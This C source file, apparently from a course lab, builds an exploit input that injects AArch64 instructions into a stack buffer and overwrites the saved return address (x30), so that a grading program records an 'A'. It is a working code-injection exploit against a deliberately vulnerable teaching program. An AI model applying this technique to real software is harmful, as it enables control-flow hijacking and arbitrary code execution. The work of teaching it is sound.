/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Joshua (Kimyung) Song, Sergei Kudriavtcev                  */
/*--------------------------------------------------------------------*/

/* File comment:
Produces a file called dataA that earns an A by placing executable
instructions into the nae array, padding the stack to reach getName's
x30, and overwiritng it with the address of name[0]. When getName
returns, jumps to the injected instructions, which write 'A' into grade
and brnach back to main.
*/

#include <stdio.h>
#include "miniassembler.h"

/* Function comment:
main takes no command-line arguments and does not read from stdin or
any other input stream. It writes binary data directly into a file
named "dataA", and produces no output to stdout or stderr. The
function returns 0 on success.
*/
int main(void) {
    FILE *psFile;
    unsigned int uiInstr;
    unsigned long ulAddr;
    int i;

    psFile = fopen("dataA", "wa");

    /* instruction 1 at name[0], #65 in ASCII is 'A'*/
    uiInstr = MiniAssembler_mov(1, 65); /* mov w1, #65 */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 2 at name[4], 0x420044 is the address of grade */
    /* adr x0, grade */
    uiInstr = MiniAssembler_adr(0, 0x420044, 0x42005c);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 3 at name[8], 'A' in to grade*/
    uiInstr = MiniAssembler_strb(1, 0); /* strb w1, [x0] */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 4 at name[12], branch back to main */
    uiInstr = MiniAssembler_b(0x40089c, 0x420064); /* b 0x40089c */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* padding */
    for (i = 16; i < 48; i++) {
        putc('A', psFile);
    }

    /* write address of name[0] in x30 */
    ulAddr = 0x420058;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 0;
}
